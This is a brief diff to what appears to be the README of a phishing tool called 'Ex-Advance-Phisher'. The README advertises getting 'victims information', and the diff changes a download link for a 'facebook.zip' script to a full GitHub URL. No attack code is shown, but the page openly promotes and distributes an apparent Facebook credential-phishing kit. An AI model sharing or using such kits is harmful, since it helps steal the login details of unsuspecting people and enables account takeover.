@@ -4,4 +4,4 @@ Get Victims Information Recived Your File Manager
 ![Logo](received_649695336185329.jpeg)
 ![Logo](received_916056232687215.jpeg)
 ## Download Script 
-<a href="facebook.zip">Download Script</a>
+<a href="https://github.com/Teamex07/Ex-Advance-Phisher/blob/main/facebook.zip">Download Script</a>
